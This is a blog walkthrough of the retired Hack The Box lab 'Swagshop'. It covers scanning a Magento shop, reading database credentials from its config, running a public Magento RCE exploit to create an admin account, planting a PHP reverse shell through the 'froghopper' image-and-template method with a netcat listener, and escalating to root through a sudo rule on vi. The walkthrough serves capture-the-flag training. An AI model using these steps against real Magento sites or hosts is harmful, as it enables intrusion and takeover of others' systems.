---
layout: post
title: "Swagshop"
categories: HTB-Walkthrough
---

![swagshop](/assets/img/swagshop/swagshop1.png)


Swagshop is another OSCP-like box from TJNull's list of retired HTB machines.



<h3>Nmap</h3>

```
nmap -sV -Pn 10.10.10.140 -sC |tee -a swag.txt


Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 18:29 EDT
Nmap scan report for 10.10.10.140
Host is up (0.096s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds
```


<hr width="300" size="10">


<h3>Gobuster</h3>
```
gobuster dir -u http://10.10.10.140/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t50 -x .php,.txt
```
```
/media (Status: 301)
/index.php (Status: 200)
/includes (Status: 301)
/lib (Status: 301)
/install.php (Status: 200)
/app (Status: 301)
/js (Status: 301)
/api.php (Status: 200)
/shell (Status: 301)
/skin (Status: 301)
/cron.php (Status: 200)
/LICENSE.txt (Status: 200)
/var (Status: 301)
/errors (Status: 301)
[ERROR] 2020/04/09 18:32:47 [!] Get http://10.10.10.140/enterprise_off.php: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/04/09 18:36:34 [!] Get http://10.10.10.140/ViewSonic_VX2025wm.php: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/mage (Status: 200)
[ERROR] 2020/04/09 18:40:37 [!] Get http://10.10.10.140/turkmenistan_Niyazov60.php: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/server-status (Status: 403)
```


<hr width="300" size="10">


<h3>Web</h3>

![swag](/assets/img/swagshop/swag-web1.png)


This is a Magento ecommerce site


<hr width="300" size="10">

We can find some database creds in:
```
http://10.10.10.140/app/etc/local.xml
```


```
<install><date>Wed, 08 May 2019 07:23:09 +0000</date></install>
<crypt><key>b355a9e0cd018d3f7f03607141518419</key></crypt><disable_local_modules>
false</disable_local_modules><resources><db><table_prefix></table_prefix></db>
<default_setup><connection><host>localhost</host>
<username>root</username><password>fMVWh7bDHpgZkyfqQXreTjU9</password>
<dbname>swagshop</dbname>
```


`searchsploit` offers a RCE exploit written in python

```
Magento eCommerce - Remote Code Execution  | exploits/xml/webapps/37977.py
```

copy it to the present working directory with:
```
searchsploit -m 37977
```

Checking the exploit out, we just need to adjust a few details.

![exploit](/assets/img/swagshop/swag-exploit.png)

Run it:

```
python exploit.py
WORKED
Check http://10.10.10.140/index.php/admin with creds sh1n0bi:sh1n0bi
```

Login with sh1n0bi/sh1n0bi


We gain access to the admin panel:

![admin-panel](/assets/img/swagshop/swag-admin-panel.png)



<hr width="300" size="10">



<h3>Froghopper</h3>

An explaination of the `froghopper` method to exploit Magento can be found [here](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper)



Copy a php-reverse-shell as a jpg file:
```
cp evil.php evil.jpg
```


Allow symlinks in `system configuration`

![symlinks](/assets/img/swagshop/swag-sys-config-dev-allow-symlinks.png)



upload image in `product category`.

![new product category](/assets/img/swagshop/swag-addproductcategory.png)


then create new `newsletter template`.

![newsletter-template](/assets/img/swagshop/swag-newsletter-template.png)

add block code between double curly braces....save it.

```

block type="core/template" template='../../../../../../media/catalog/category/evil.jpg'

```

Make sure that a netcat listener is set
```
nc -nlvp 6969
```

Select the created template and click 'preview' to execute the reverse-shell.

![revshell](/assets/img/swagshop/swag-revshell.png)




<hr width="300" size="10">



Improve the shell:
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@swagshop:/$ ^Z
[1]+  Stopped                 nc -nlvp 6969
root@kali:~/HTB/active/swagshop# stty raw -echo
root@kali:~/HTB/active/swagshop# nc -nlvp 6969
root@kali:~/HTB/active/swagshop# fg
www-data@swagshop:/$ 
```

<hr width="300" size="10">


<h3>Privilege Escalation</h3>


One of the first commands you should always try is `sudo -l` it can potentially reveal what commands
a user can make as root:

```
www-data@swagshop:/$ sudo -l
Matching Defaults entries for www-data on swagshop:                                                                
    env_reset, mail_badpass,                                                                                       
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                       
                                                                                                                   
User www-data may run the following commands on swagshop:                                                          
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*                                                                   
www-data@swagshop:/$               
```

www-data can open any file in the /var/www/html directory with the `vi` editor as root...

```
www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/cron.sh
```

when we have our file open, we can get a shell with the `:shell` command.

```
www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/cron.sh                                            
                                                                                                                   
E558: Terminal entry not found in terminfo                                                                         
'unknown' not known. Available builtin terminals are:                                                              
    builtin_amiga                                                                                                  
    builtin_beos-ansi                                                                                              
    builtin_ansi                                                                                                   
    builtin_pcansi                                                                                                 
    builtin_win32                                                                                                  
    builtin_vt320                                                                                                  
    builtin_vt52                                                                                                   
    builtin_xterm                                                                                                  
    builtin_iris-ansi                                                                                              
    builtin_debug                                                                                                  
    builtin_dumb
defaulting to 'ansi'
#!/bin/sh
# location of the php binary
if [ ! "$1" = "" ] ; then
    CRONSCRIPT=$1
else
    CRONSCRIPT=cron.php
fi

MODE=""
if [ ! "$2" = "" ] ; then
        MODE=" $2"
fi

PHP_BIN=`which php`

# absolute path to magento installation
INSTALLDIR=`echo $0 | sed 's/cron\.sh//g'`

#       prepend the intallation path if not given an absolute path
if [ "$INSTALLDIR" != "" -a "`expr index $CRONSCRIPT /`" != "1" ];then
    if ! ps auxwww | grep "$INSTALLDIR$CRONSCRIPT$MODE" | grep -v grep 1>/dev/nu
ll 2>/dev/null ; then
        $PHP_BIN $INSTALLDIR$CRONSCRIPT$MODE &
:shell
root@swagshop:/var/www/html# 
```

Grab both user and root flags!!!

```
root@swagshop:/var/www/html# cat /home/haris/user.txt
a4xxxxxxxxxxxxxxxxxxxxxxxxxxxac8
root@swagshop:/var/www/html# cat /root/root.txt
c2xxxxxxxxxxxxxxxxxxxxxxxxxxx721

   ___ ___
 /| |/|\| |\
/_|  |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
root@swagshop:/var/www/html# 
```

I bought a T-shirt and some stickerz!!!

:)
